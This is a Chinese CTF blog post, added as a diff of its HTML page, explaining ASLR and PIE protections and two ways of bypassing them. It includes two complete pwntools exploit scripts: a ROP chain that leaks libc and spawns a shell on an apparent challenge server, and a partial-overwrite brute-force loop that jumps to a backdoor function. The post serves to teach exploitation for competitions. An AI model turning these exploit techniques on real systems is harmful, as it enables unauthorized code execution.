@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+       
+      <meta name="keywords" content="生活，思考 ，渗透，审计，代码。。。" />
+       
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>ASLR和PIE |  小透的少年江湖</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/haoyun.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-ASLR和PIE"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  ASLR和PIE
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/03/07/ASLR%E5%92%8CPIE/" class="article-date">
+  <time datetime="2024-03-07T01:56:28.000Z" itemprop="datePublished">2024-03-07</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a> / <a class="article-category-link" href="/categories/CTF/pwn/">pwn</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.6k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">6 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="ASLR和PIE"><a href="#ASLR和PIE" class="headerlink" title="ASLR和PIE"></a>ASLR和PIE</h1><p><strong>ASLR</strong></p>
+<p>地址空间布局随机化（Address Space Layout Randomization,ASLR），引入内存布局的随机化能有效增加漏洞利用难度。ASLR提供的只是概率上的安全性，根据用于随机化的熵，攻击者有可能幸运地猜测到正确的地址，有时攻击者还可以爆破。</p>
+<p>在linux系统上，ASLR的全局配置**&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space** 有以下三种情况：</p>
+<p>0 - 表示关闭进程地址空间随机化<br>1 - 表示将mmap的基址，stack和vdso页面随机化<br>2 - 表示在1的基础上增加栈（heap）的随机化</p>
+<p>如下查看ASLR配置，此时系统上为2</p>
+<img src="/2024/03/07/ASLR%E5%92%8CPIE/image-20240307102642390.png" class title="image-20240307102642390">
+
+<p><strong>PIE</strong></p>
+<p><strong>PIE</strong> 全称为位置无关可执行文件（Position-Independent Executable）,它在应用层的编译器上实现，通过将程序编译为位置无关代码（Position-Independent Code, PIC）,使程序可以加载到任意位置，就像一个特殊的共享库。在 <strong>PIE和ASLR同时开启</strong> 的情况下，攻击者将对程序内部布局一无所知，大大增加了利用难度。</p>
+<p>GCC支持的PIE选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fpic       为共享库生成位置无关代码</span><br><span class="line">-pie        生成动态链接的位置无关的可执行文件，通常需要同时指定 -fpie</span><br><span class="line">-no-pie     不生成动态链接的位置无关的可执行文件</span><br><span class="line">-fpie       类似于-fpic，但生成的位置无关代码只能用于可执行文件，通常同时指定-pie</span><br><span class="line">-fno-pie    不生成位置无关代码</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul>
+<li>泄露地址</li>
+<li>partial write</li>
+</ul>
+<h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>PIE保护机制影响的是程序加载的基质，并不影响程序中函数以及指令之间的相对地址。因此可以通过泄露程序中某个函数地址和偏移距离来推断出其他函数的地址。</p>
+<p>例题反汇编后的伪代码如下，任意输入三个数字</p>
+<img src="/2024/03/07/ASLR%E5%92%8CPIE/image-20240307103733043.png" class title="image-20240307103733043">
+
+<p>其中vul函数中存在明显的栈溢出</p>
+<img src="/2024/03/07/ASLR%E5%92%8CPIE/image-20240307103826637.png" class title="image-20240307103826637">
+
+<p>由于该程序开启了ASLR和PIE，所以不能直接覆盖got表</p>
+<p><strong>PIE保护机制不会随机化地址的低12位(十六进制的后3位)</strong></p>
+<p>思路如下</p>
+<ol>
+<li>首先获取程序运行时libc的基质。利用libc_start_main的地址减去到libc的偏移距离，得到libc基址</li>
+<li>通过libc地址来获取system和&#x2F;bash&#x2F;sh的地址</li>
+</ol>
+<p>具体做法是利用 <strong>put()</strong> 函数是打印一个字符串，直到遇到 ‘<strong>\x00</strong>‘才会停止打印，而我们输入的函数是 <strong>read()</strong> ，它不会帮我们添加 ‘<strong>\x00</strong>‘,所以我们能用这个点来泄露出 <strong>vlu()</strong> 的返回地址，即main函数里的地址，也就能得到程序的运行基址，注意到 <strong>vul()</strong> 的返回地址为 <strong>A89</strong> ，而我们只能覆盖一个字节，开了PIE后只有最后三位是相同的，所以不能覆盖两个字节，所以我们只能回到 <strong>A7F</strong>处，同样能达到我们再次栈溢出的目的</p>
+<img src="/2024/03/07/ASLR%E5%92%8CPIE/image-20240307110107332.png" class title="image-20240307110107332">
+
+<p>然后有了程序基址，我们正常利用puts的<strong>plt表</strong>来调用puts泄露<strong>got表</strong>内容，因为got表写的是libc函数地址，所以就等于我们得到了libc基址</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./checkin_revenge&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;172.16.68.4&quot;</span>, <span class="number">10002</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./checkin_revenge&quot;</span>)</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">str</span>(<span class="number">1</span>)</span><br><span class="line">b = <span class="built_in">str</span>(<span class="number">2</span>)</span><br><span class="line">c = <span class="built_in">str</span>(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">off = <span class="number">0x10</span> + <span class="number">8</span> </span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give me your a:&quot;</span>,a)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give me your b:&quot;</span>,b)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give me your c:&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;bp $rebase(0x991)&quot;)</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * off + <span class="string">&quot;\x7f&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">main_addr = u64(p.recvuntil(<span class="string">&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;main:&quot;</span> + <span class="built_in">hex</span>(main_addr))</span><br><span class="line">code_base = main_addr &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&quot;puts&quot;</span>] + code_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt:&quot;</span> + <span class="built_in">hex</span>(puts_plt))</span><br><span class="line">puts_got = e.got[<span class="string">&quot;puts&quot;</span>] + code_base</span><br><span class="line">pop_rdi = <span class="number">0x0000000000000b03</span> +  code_base</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * off  + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr) </span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr:&quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./x86_libc.so.6&quot;)</span></span><br><span class="line">base_addr = puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system_addr = base_addr + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = base_addr + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">success(<span class="string">&quot;system:&quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;binsh:&quot;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * off + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="partial-write"><a href="#partial-write" class="headerlink" title="partial write"></a>partial write</h3><p><strong>partial write</strong> (部分写入)就是一种利用了PIE技术缺陷的绕过技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。<strong>因此通过覆盖EIP的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP</strong>。</p>
+<p>例题如下：</p>
+<p>开启了PIE和NX保护</p>
+<img src="/2024/03/07/ASLR%E5%92%8CPIE/image-20240307110906921.png" class title="image-20240307110906921">
+
+<p>反汇编后伪代码如下</p>
+<img src="/2024/03/07/ASLR%E5%92%8CPIE/image-20240307111024585.png" class title="image-20240307111024585">
+
+<p>进入dosms函数</p>
+<img src="/2024/03/07/ASLR%E5%92%8CPIE/image-20240307111037307.png" class title="image-20240307111037307">
+
+<p>进入set_user函数</p>
+<img src="/2024/03/07/ASLR%E5%92%8CPIE/image-20240307111056578.png" class title="image-20240307111056578">
+
+<p>进入set_sms函数</p>
+<img src="/2024/03/07/ASLR%E5%92%8CPIE/image-20240307111114473.png" class title="image-20240307111114473">
+
+<p>并且程序中存在后门函数frontdoor，如下</p>
+<img src="/2024/03/07/ASLR%E5%92%8CPIE/image-20240307111158105.png" class title="image-20240307111158105">
+
+<p>思路如下：</p>
+<ol>
+<li>在set_sms()中fgets函数向s处读入数据，再通过strncpy函数将s的(a1+180)长度复制到a1。这里只要a1+180数值足够大就可以造成栈溢出</li>
+<li>由set_user()中可以得到a1+180处可以被修改，所以可以利用栈溢出改写程序的返回地址为frontdoor的地址即可</li>
+</ol>
+<p>但由于程序设置了PIE保护，无法知道后门函数的准备地址，只知道地址后3位为<strong>0x900</strong>。所以我们利用 <strong>partial write</strong> 方法来部分覆盖返回地址，但是由于payload必须按字节写入，每个字节是两个十六进制数，所以我们必须输入两个字节，就是4个十六进制数。除去已知的0x900还需要爆破一个十六进制数。这个数只可能在0~0xf之间改变，因此爆破空间不大，可以接受。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    success(<span class="string">&quot;this is the %d times&quot;</span> % i)</span><br><span class="line">    p = process(<span class="string">&#x27;./SMS&#x27;</span>)</span><br><span class="line">    payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">40</span> + <span class="string">&#x27;\xca&#x27;</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter your name\n&#x27;</span>, payload1)</span><br><span class="line">    payload2 = <span class="string">&#x27;b&#x27;</span>*<span class="number">200</span> + <span class="string">&#x27;\x01\x09&#x27;</span>  <span class="comment"># 这里假设实际地址低16位为0x0901，爆破直到地址正确</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;SMS our leader\n&#x27;</span>, payload2)</span><br><span class="line">    p.recv()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recv(timeout = <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()   <span class="comment"># 如果触发异常，即地址第16位不为0x0901，那么关闭程序，继续下一趟的尝试</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:   <span class="comment"># 没有触发异常，说明程序成功调用frontdoor，那么输入参数获取shell</span></span><br><span class="line">        p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/03/07/ASLR%E5%92%8CPIE/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWn-ASLR/" rel="tag">-PWn -ASLR</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2024/03/07/Frida-Hook%E4%BD%BF%E7%94%A8/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Frida-Hook使用
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2024/03/06/No-execute%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">No-execute保护机制</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "BAHT50PldtBLrMFvOb5LqqlL-gzGzoHsz",
+    app_key: "tj3HfiFvtJ3pRIhgXGBqdN7b",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021-2024
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/haoyun.ico" alt="小透的少年江湖"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="http://haoyun-forever.lofter.com/">摄影</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>让我给大家分享喜悦吧！</p>
+  <div class="reward-box">
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/%E5%BE%AE%E4%BF%A1.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=1858011775&auto=1&height=66"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
